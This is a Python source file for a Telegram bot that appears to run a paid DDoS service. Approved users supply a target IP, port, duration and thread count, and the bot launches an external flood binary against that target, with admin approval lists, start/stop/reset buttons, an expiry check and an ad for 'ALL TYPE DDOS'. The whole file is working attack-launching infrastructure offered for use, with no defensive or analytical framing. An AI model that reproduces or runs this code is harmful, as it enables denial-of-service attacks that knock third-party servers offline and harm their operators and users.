import subprocess
import logging
import os
import json
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
from billa import TOKEN
from datetime import datetime

# Admins and expiry setup
ADMIN_IDS = [6073143283, 1931465158, 6945183108]
EXPIRY_DATE = datetime(2024, 12, 28)

# Paths and global variables
BINARY_PATH = "./om"
APPROVED_USERS_FILE = "approved_users.txt"

# Set up logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

process = None
target_ip = None
target_port = None
attack_time = None
thread_count = None


# Expiry check
def check_expiry():
    current_date = datetime.now()
    return current_date > EXPIRY_DATE


# Load replies from JSON
def load_replies():
    try:
        with open("replies.json", "r") as file:
            return json.load(file)
    except FileNotFoundError:
        logging.error("Replies configuration file not found!")
        return {}


REPLIES = load_replies()


# Load and save approved users
def load_approved_users():
    if os.path.exists(APPROVED_USERS_FILE):
        with open(APPROVED_USERS_FILE, "r") as file:
            return set(int(line.strip()) for line in file)
    return set()


def save_approved_user(user_id):
    with open(APPROVED_USERS_FILE, "a") as file:
        file.write(f"{user_id}\n")


def remove_approved_user(user_id):
    if user_id in approved_users:
        approved_users.remove(user_id)
        with open(APPROVED_USERS_FILE, "w") as file:
            for uid in approved_users:
                file.write(f"{uid}\n")


approved_users = load_approved_users()


# Admin and approval checks
def is_admin(update: Update) -> bool:
    return update.effective_user.id in ADMIN_IDS


def is_approved(user_id) -> bool:
    return user_id in approved_users or user_id in ADMIN_IDS


# Start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id

    if check_expiry():
        keyboard1 = [[InlineKeyboardButton("SEND MESSAGE", url="https://t.me/viphandal001155")]]
        reply_markup1 = InlineKeyboardMarkup(keyboard1)
        await update.message.reply_text(
            "🚀This script has expired. DM for New Script. Made by t.me/Zamir001155",
            reply_markup=reply_markup1
        )
        keyboard2 = [[InlineKeyboardButton("JOIN CHANNEL", url="https://t.me/viphandal001155")]]
        reply_markup2 = InlineKeyboardMarkup(keyboard2)
        await update.message.reply_text(
            "📢 HAMDEL ddos\nALL TYPE DDOS AVAILABLE:-\n t.me/viphandal001155",
            reply_markup=reply_markup2
        )
        return

    if is_approved(user_id):
        keyboard = [[InlineKeyboardButton("🚀Attack🚀", callback_data='attack')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(REPLIES["start_approved"], reply_markup=reply_markup)
    else:
        await update.message.reply_text(REPLIES["not_approved"])


# Approve users
async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await update.message.reply_text("This action is for admin use only.")
        return

    try:
        user_id_to_approve = int(context.args[0])
        if user_id_to_approve not in approved_users:
            approved_users.add(user_id_to_approve)
            save_approved_user(user_id_to_approve)
            await update.message.reply_text(f"User {user_id_to_approve} has been approved.")
        else:
            await update.message.reply_text(f"User {user_id_to_approve} is already approved.")
    except (IndexError, ValueError):
        await update.message.reply_text("Please provide a valid user ID to approve.")


# Disapprove users
async def disapprove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await update.message.reply_text("This action is for admin use only.")
        return

    try:
        user_id_to_disapprove = int(context.args[0])
        if user_id_to_disapprove in approved_users:
            remove_approved_user(user_id_to_disapprove)
            await update.message.reply_text(f"User {user_id_to_disapprove} has been disapproved.")
        else:
            await update.message.reply_text(f"User {user_id_to_disapprove} is not in the approved list.")
    except (IndexError, ValueError):
        await update.message.reply_text("Please provide a valid user ID to disapprove.")


# Button handlers
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = update.effective_user.id

    if not is_approved(user_id):
        await query.message.reply_text(REPLIES["not_approved"])
        await query.answer()
        return

    await query.answer()

    if query.data == 'attack':
        await query.message.reply_text(REPLIES["input_ip_port_time"])


# Input handler for attack parameters
async def handle_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user is None:
        await update.message.reply_text("Could not determine the user. Please try again.")
        return

    user_id = update.effective_user.id

    if not is_approved(user_id):
        await update.message.reply_text(REPLIES["not_approved"])
        return

    global target_ip, target_port, attack_time, thread_count

    try:
        input_data = update.message.text.split()
        if len(input_data) == 3:
            target, port, time = input_data
            threads = 200  # Default thread count
        elif len(input_data) == 4:
            target, port, time, threads = input_data
            threads = int(threads)
        else:
            raise ValueError

        target_ip = target
        target_port = int(port)
        attack_time = int(time)
        thread_count = threads

        keyboard = [
            [InlineKeyboardButton("Start Attack🚀", callback_data='start_attack')],
            [InlineKeyboardButton("Stop Attack❌", callback_data='stop_attack')],
            [InlineKeyboardButton("Reset Attack⚙️", callback_data='reset_attack')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            f"Target: {target_ip}, Port: {target_port}, Time: {attack_time} seconds, Threads: {thread_count} configured.\nNow choose an action:",
            reply_markup=reply_markup
        )
    except ValueError:
        await update.message.reply_text('''Invalid format. Please enter in the format: 
<target> <port> <time> [threads]🚀🚀 (Threads are optional, default is 200.)''')


# Attack commands
async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global process, target_ip, target_port, attack_time, thread_count

    if not target_ip or not target_port or not attack_time:
        await update.callback_query.message.reply_text("Please configure the target, port, and time first.")
        return

    try:
        process = subprocess.Popen(
            [BINARY_PATH, target_ip, str(target_port), str(attack_time), str(thread_count)],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        await update.callback_query.message.reply_text(
            f"Attack started on {target_ip}:{target_port} for {attack_time} seconds with {thread_count} threads."
        )
    except Exception as e:
        await update.callback_query.message.reply_text(f"Error starting attack: {e}")


async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global process
    if process and process.poll() is None:  # Check if a process is running
        process.terminate()
        process.wait()
        await update.callback_query.message.reply_text("Attack stopped.")
    else:
        await update.callback_query.message.reply_text("No attack is running.")


async def reset_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global process, target_ip, target_port, attack_time, thread_count
    if process and process.poll() is None:  # Check if a process is running
        process.terminate()
        process.wait()

    target_ip, target_port, attack_time, thread_count = None, None, None, None
    await update.callback_query.message.reply_text("Attack parameters reset.")


async def button_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == 'start_attack':
        await start_attack(update, context)
    elif query.data == 'stop_attack':
        await stop_attack(update, context)
    elif query.data == 'reset_attack':
        await reset_attack(update, context)


# Main bot function
def main():
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("approve", approve_user))
    application.add_handler(CommandHandler("disapprove", disapprove_user))
    application.add_handler(CallbackQueryHandler(button_handler, pattern='^attack$'))
    application.add_handler(CallbackQueryHandler(button_callback_handler, pattern='^(start_attack|stop_attack|reset_attack)$'))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_input))

    application.run_polling()


if __name__ == "__main__":
    main()
